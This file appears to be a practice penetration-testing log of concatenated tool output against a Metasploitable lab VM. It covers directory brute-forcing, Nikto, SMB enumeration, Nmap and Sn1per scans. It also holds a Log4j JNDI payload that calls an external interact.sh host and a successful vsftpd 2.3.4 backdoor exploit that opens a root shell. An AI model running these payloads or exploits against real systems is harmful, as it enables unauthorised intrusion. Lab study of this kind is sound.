@@ -1,0 +1,367 @@
+# Dirsearch started Mon May 23 15:53:40 2022 as: dirsearch.py -l httpx.txt -o dirsearch.txt
+
+403   298B   http://172.22.201.155:80/.ht_wsr.txt
+403   301B   http://172.22.201.155:80/.htaccess.bak1
+403   301B   http://172.22.201.155:80/.htaccess.orig
+403   303B   http://172.22.201.155:80/.htaccess.sample
+403   301B   http://172.22.201.155:80/.htaccess_orig
+403   301B   http://172.22.201.155:80/.htaccess.save
+403   299B   http://172.22.201.155:80/.htaccess_sc
+403   300B   http://172.22.201.155:80/.htaccessOLD2
+403   299B   http://172.22.201.155:80/.htaccessOLD
+403   302B   http://172.22.201.155:80/.htaccess_extra
+403   291B   http://172.22.201.155:80/.htm
+403   299B   http://172.22.201.155:80/.htaccessBAK
+403   297B   http://172.22.201.155:80/.htpasswds
+403   292B   http://172.22.201.155:80/.html
+403   301B   http://172.22.201.155:80/.htpasswd_test
+403   298B   http://172.22.201.155:80/.httr-oauth
+403   295B   http://172.22.201.155:80/cgi-bin/
+200   111KB  http://172.22.201.155:80/doc/
+302     0B   http://172.22.201.155:80/dvwa/    -> REDIRECTS TO: login.php
+200   891B   http://172.22.201.155:80/index.php
+200   891B   http://172.22.201.155:80/index
+200   891B   http://172.22.201.155:80/index.php/login/
+200    24KB  http://172.22.201.155:80/mutillidae/
+200    49KB  http://172.22.201.155:80/phpinfo
+200    49KB  http://172.22.201.155:80/phpinfo.php
+301   326B   http://172.22.201.155:80/phpMyAdmin    -> REDIRECTS TO: http://172.22.201.155/phpMyAdmin/
+200     4KB  http://172.22.201.155:80/phpMyAdmin/
+200     4KB  http://172.22.201.155:80/phpMyAdmin/index.php
+403   300B   http://172.22.201.155:80/server-status
+403   301B   http://172.22.201.155:80/server-status/
+301   320B   http://172.22.201.155:80/test    -> REDIRECTS TO: http://172.22.201.155/test/
+200   885B   http://172.22.201.155:80/test/
+301   324B   http://172.22.201.155:80/tikiwiki    -> REDIRECTS TO: http://172.22.201.155/tikiwiki/
+
+Scan Aborted: --url Invalid port number: "5060,80,8443,2000,443,8080"
+https://hackerone.com
+172.17.45.99
+
+[•] CVE-2021-44228 - Apache Log4j RCE Scanner
+[•] Scanner provided by FullHunt.io - The Next-Gen Attack Surface Management Platform.
+[•] Secure your External Attack Surface with FullHunt.io.
+[•] Initiating DNS callback server (interact.sh).
+[%] Checking for Log4j RCE CVE-2021-44228.
+[•] URL: http://172.23.101.159
+[•] URL: http://172.23.101.159 | PAYLOAD: ${jndi:ldap://172.23.101.159.650rr10199fj4w0g8km77w94o8911498u.interact.sh/64l2j30}
+EXCEPTION: [Errno 2] No such file or directory: 'headers.txt'
+[•] Payloads sent to all URLs. Waiting for DNS OOB callbacks.
+[•] Waiting...
+[•] Targets do not seem to be vulnerable.172.17.227.155:25
+172.17.227.155:80
+172.17.227.155:23
+172.17.227.155:5432
+172.17.227.155:22
+172.17.227.155:53
+172.17.227.155:513
+172.17.227.155:139
+172.17.227.155:8009
+172.17.227.155:514
+172.17.227.155:111
+172.17.227.155:6000
+172.17.227.155:2049
+172.17.227.155:21
+172.17.227.155:2121
+172.17.227.155:3306
+172.17.227.155:5900
+172.17.227.155:445
+hackerone.com:5060
+hackerone.com:80
+hackerone.com:8443
+hackerone.com:443
+hackerone.com:8080
+hackerone.com:2000
+Doing NBT name scan for addresses from 172.23.101.159
+
+
+NetBIOS Name Table for Host 172.23.101.159:
+
+Incomplete packet, 335 bytes long.
+Name             Service          Type
+----------------------------------------
+METASPLOITABLE   <00>             UNIQUE
+METASPLOITABLE   <03>             UNIQUE
+METASPLOITABLE   <20>             UNIQUE
+METASPLOITABLE   <00>             UNIQUE
+METASPLOITABLE   <03>             UNIQUE
+METASPLOITABLE   <20>             UNIQUE
+__MSBROWSE__  <01>              GROUP
+WORKGROUP        <00>              GROUP
+WORKGROUP        <1d>             UNIQUE
+WORKGROUP        <1e>              GROUP
+WORKGROUP        <00>              GROUP
+WORKGROUP        <1d>             UNIQUE
+WORKGROUP        <1e>              GROUP
+
+Adapter address: 00:00:00:00:00:00
+----------------------------------------- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          172.23.101.159
++ Target Hostname:    172.23.101.159
++ Target Port:        80
++ Start Time:         2022-05-21 15:00:16 (GMT1)
+---------------------------------------------------------------------------
++ Server: Apache/2.2.8 (Ubuntu) DAV/2
++ Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Uncommon header 'tcn' found, with contents: list
++ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.php
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST
++ /phpinfo.php: Output from the phpinfo() function was found.
++ OSVDB-3268: /doc/: Directory indexing found.
++ OSVDB-48: /doc/: The /doc/ directory is browsable. This may be /usr/doc.
++ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-12184: /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
++ OSVDB-3092: /phpMyAdmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ Server may leak inodes via ETags, header found with file /phpMyAdmin/ChangeLog, inode: 92462, size: 40540, mtime: Tue Dec  9 18:24:00 2008
++ OSVDB-3092: /phpMyAdmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ OSVDB-3268: /test/: Directory indexing found.
++ OSVDB-3092: /test/: This might be interesting...
++ OSVDB-3233: /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
++ OSVDB-3268: /icons/: Directory indexing found.
++ OSVDB-3233: /icons/README: Apache default file found.
++ /phpMyAdmin/: phpMyAdmin directory found
++ OSVDB-3092: /phpMyAdmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ OSVDB-3092: /phpMyAdmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.
++ 8726 requests: 0 error(s) and 27 item(s) reported on remote host
++ End Time:           2022-05-21 15:00:55 (GMT1) (39 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested172.17.146.160:2000
+172.17.146.160:5060
+ 2000/cisco-sccp?
+ 5060/sip?
+Anonymous login successful
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        print$          Disk      Printer Drivers
+        tmp             Disk      oh noes!
+        opt             Disk
+        IPC$            IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+        ADMIN$          IPC       IPC Service (metasploitable server (Samba 3.0.20-Debian))
+Reconnecting with SMB1 for workgroup listing.
+Anonymous login successful
+
+        Server               Comment
+        ---------            -------
+
+        Workgroup            Master
+        ---------            -------
+        WORKGROUP            METASPLOITABLEStarting PostgreSQL 14 database server: main.
+[94m[*][0m Loaded configuration file from /usr/share/sniper/sniper.conf [94m[[0m[92mOK[0m[94m][0m
+[94m[*][0m Loaded configuration file from /root/.sniper.conf [94m[[0m[92mOK[0m[94m][0m
+[94m[*][0m Saving loot to /usr/share/sniper/loot/ [94m[[0m[92mOK[0m[94m][0m
+[94m[*][0m Scanning 172.23.101.159 [94m[[0m[92mOK[0m[94m][0m
+Starting PostgreSQL 14 database server: main.
+[94m[*][0m Loaded configuration file from /usr/share/sniper/sniper.conf [94m[[0m[92mOK[0m[94m][0m
+[94m[*][0m Loaded configuration file from /root/.sniper.conf [94m[[0m[92mOK[0m[94m][0m
+[94m[*][0m Saving loot to /usr/share/sniper/loot/workspace/172.23.101.159 [94m[[0m[92mOK[0m[94m][0m
+[94m[*][0m Scanning 172.23.101.159 [94m[[0m[92mOK[0m[94m][0m
+[91m                ____               [0m
+[91m    _________  /  _/___  ___  _____[0m
+[91m   / ___/ __ \ / // __ \/ _ \/ ___/[0m
+[91m  (__  ) / / // // /_/ /  __/ /    [0m
+[91m /____/_/ /_/___/ .___/\___/_/     [0m
+[91m               /_/                 [0m
+[0m
+[93m + -- --=[https://sn1persecurity.com
+[93m + -- --=[Sn1per v9.0 by @xer0dayz
+[0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:30)[0mx•
+[91m GATHERING DNS INFO [0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:30)[0mx•
+[92m====================================================================================[0m•x[92m[2022-05-22](10:30)[0mx•
+[91m CHECKING FOR SUBDOMAIN HIJACKING [0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:30)[0mx•
+
+[92m====================================================================================[0m•x[92m[2022-05-22](10:30)[0mx•
+[91m PINGING HOST [0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:30)[0mx•
+PING 172.23.101.159 (172.23.101.159): 56 data bytes
+64 bytes from 172.23.101.159: icmp_seq=0 ttl=64 time=30.810 ms
+--- 172.23.101.159 ping statistics ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max/stddev = 30.810/30.810/30.810/0.000 ms
+
+[92m====================================================================================[0m•x[92m[2022-05-22](10:30)[0mx•
+[91m RUNNING TCP PORT SCAN [0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:30)[0mx•
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-22 10:30 CET
+Nmap scan report for 172.23.101.159
+Host is up (0.081s latency).
+Not shown: 41 closed tcp ports (reset)
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+23/tcp   open  telnet
+25/tcp   open  smtp
+53/tcp   open  domain
+80/tcp   open  http
+111/tcp  open  rpcbind
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+512/tcp  open  exec
+513/tcp  open  login
+514/tcp  open  shell
+1099/tcp open  rmiregistry
+1524/tcp open  ingreslock
+2049/tcp open  nfs
+2121/tcp open  ccproxy-ftp
+3306/tcp open  mysql
+3632/tcp open  distccd
+5432/tcp open  postgresql
+5900/tcp open  vnc
+6667/tcp open  irc
+8180/tcp open  unknown
+MAC Address: 00:0C:29:26:9F:8A (VMware)
+
+Nmap done: 1 IP address (1 host up) scanned in 4.12 seconds
+
+[92m====================================================================================[0m•x[92m[2022-05-22](10:30)[0mx•
+[91m RUNNING INTRUSIVE SCANS [0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:30)[0mx•
+[93m + -- --=[Port 21 opened... running tests...[0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:31)[0mx•
+[91m RUNNING NMAP SCRIPTS [0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:31)[0mx•
+Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-22 10:31 CET
+NSE: Loaded 54 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 10:31
+Completed NSE at 10:31, 0.00s elapsed
+Initiating NSE at 10:31
+Completed NSE at 10:31, 0.00s elapsed
+Initiating ARP Ping Scan at 10:31
+Scanning 172.23.101.159 [1 port]
+Completed ARP Ping Scan at 10:31, 0.20s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 10:31
+Completed Parallel DNS resolution of 1 host. at 10:31, 1.04s elapsed
+Initiating SYN Stealth Scan at 10:31
+Scanning 172.23.101.159 [1 port]
+Discovered open port 21/tcp on 172.23.101.159
+Completed SYN Stealth Scan at 10:31, 0.07s elapsed (1 total ports)
+Initiating Service scan at 10:31
+Scanning 1 service on 172.23.101.159
+Completed Service scan at 10:31, 1.77s elapsed (1 service on 1 host)
+Initiating OS detection (try #1) against 172.23.101.159
+NSE: Script scanning 172.23.101.159.
+Initiating NSE at 10:31
+NSE: [ftp-bounce 172.23.101.159:21] PORT response: 500 Illegal PORT command.
+NSE Timing: About 70.83% done; ETC: 10:32 (0:00:30 remaining)
+Completed NSE at 10:32, 91.05s elapsed
+Initiating NSE at 10:32
+Completed NSE at 10:32, 0.05s elapsed
+Nmap scan report for 172.23.101.159
+Host is up (0.020s latency).
+
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| ftp-vsftpd-backdoor: 
+|   VULNERABLE:
+|   vsFTPd version 2.3.4 backdoor
+|     State: VULNERABLE (Exploitable)
+|     IDs:  CVE:CVE-2011-2523  BID:48539
+|       vsFTPd version 2.3.4 backdoor, this was reported on 2011-07-04.
+|     Disclosure date: 2011-07-03
+|     Exploit results:
+|       Shell command: id
+|       Results: uid=0(root) gid=0(root)
+|     References:
+|       https://www.securityfocus.com/bid/48539
+|       http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-2523
+|_      https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to 172.23.101.160
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      vsFTPd 2.3.4 - secure, fast, stable
+|_End of status
+MAC Address: 00:0C:29:26:9F:8A (VMware)
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running: Linux 2.6.X
+OS CPE: cpe:/o:linux:linux_kernel:2.6
+OS details: Linux 2.6.9 - 2.6.33
+Uptime guess: 0.825 days (since Sat May 21 14:44:42 2022)
+Network Distance: 1 hop
+TCP Sequence Prediction: Difficulty=193 (Good luck!)
+IP ID Sequence Generation: All zeros
+Service Info: OS: Unix
+
+TRACEROUTE
+HOP RTT      ADDRESS
+1   19.71 ms 172.23.101.159
+
+NSE: Script Post-scanning.
+Initiating NSE at 10:32
+Completed NSE at 10:32, 0.00s elapsed
+Initiating NSE at 10:32
+Completed NSE at 10:32, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 97.39 seconds
+           Raw packets sent: 24 (2.114KB) | Rcvd: 20 (1.826KB)
+[92m====================================================================================[0m•x[92m[2022-05-22](10:32)[0mx•
+[91m RUNNING METASPLOIT FTP VERSION SCANNER [0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:32)[0mx•
+[0mRHOST => 172.23.101.159
+[0mRHOSTS => 172.23.101.159
+[0m[0m[1m[32m[+][0m 172.23.101.159:21     - FTP Banner: '220 (vsFTPd 2.3.4)\x0d\x0a'
+[1m[34m[*][0m 172.23.101.159:21     - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[0m[92m====================================================================================[0m•x[92m[2022-05-22](10:33)[0mx•
+[91m RUNNING METASPLOIT ANONYMOUS FTP SCANNER [0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:33)[0mx•
+[0mRHOST => 172.23.101.159
+[0mRHOSTS => 172.23.101.159
+[0m[0m[1m[32m[+][0m 172.23.101.159:21     - 172.23.101.159:21 - Anonymous READ (220 (vsFTPd 2.3.4))
+[1m[34m[*][0m 172.23.101.159:21     - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+[0m[92m====================================================================================[0m•x[92m[2022-05-22](10:33)[0mx•
+[91m RUNNING VSFTPD 2.3.4 BACKDOOR EXPLOIT [0m
+[92m====================================================================================[0m•x[92m[2022-05-22](10:33)[0mx•
+[0mRHOST => 172.23.101.159
+[0mRHOSTS => 172.23.101.159
+[0mLHOST => 127.0.0.1
+[0mLPORT => 4444
+[0m[1m[34m[*][0m No payload configured, defaulting to cmd/unix/interact
+[0m[1m[34m[*][0m 172.23.101.159:21 - Banner: 220 (vsFTPd 2.3.4)
+[1m[34m[*][0m 172.23.101.159:21 - USER: 331 Please specify the password.
+[1m[32m[+][0m 172.23.101.159:21 - Backdoor service has been spawned, handling...
+[1m[32m[+][0m 172.23.101.159:21 - UID: uid=0(root) gid=0(root)
+[1m[34m[*][0m Found shell.
+[1m[34m[*][0m Command shell session 1 opened (172.23.101.160:42895 -> 172.23.101.159:6200) at 2022-05-22 10:33:28 +0100
+
+[0m172.17.227.155
+hackerone.comwpscan --url 172.23.101.159/ --enumerate u,t,p | tee wpscan-enum-172.23.101.159-80.tx
+_______________________________________________________________
+         __          _______   _____
+         \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+             \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+         WordPress Security Scanner by the WPScan Team
+                         Version 3.8.22
+       Sponsored by Automattic - https://automattic.com/
+       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+
+Scan Aborted: The remote website is up, but does not seem to be running WordPress.
